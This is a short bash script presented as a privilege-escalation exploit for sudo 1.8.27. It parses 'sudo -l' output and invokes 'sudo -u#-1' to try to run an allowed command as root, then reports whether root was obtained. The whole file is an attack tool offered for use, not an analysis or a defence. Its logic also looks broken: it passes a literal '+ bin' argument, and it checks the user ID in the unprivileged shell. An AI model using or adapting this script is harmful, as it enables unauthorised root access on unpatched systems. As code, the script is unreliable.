#!/bin/bash

tput clear
cat << "EOF"
                 Simple Privilege Escalation   
                   Works with sudo-1.8.27       
EOF

read -p "Enter the current username -> " username

echo
echo "-> uid=$username(`id -u`)"
echo 
echo "Starting the exploit"
echo

sudo -l > permissions

cat permissions | grep 'ALL' | cut -d ')' -f 2 > bin || true

sudo -u#-1 + bin || true 

uid=`id -u > bloc_uid`

if [ "$(cat bloc_uid)" == 0 ]
 then echo "The exploit successfully executed -> uid=root(`id -u`)"

else
  echo 
  echo "Non-vulnerable system -> uid=$username(`id -u`)"
  echo
fi

rm bloc_uid
rm bin
rm permissions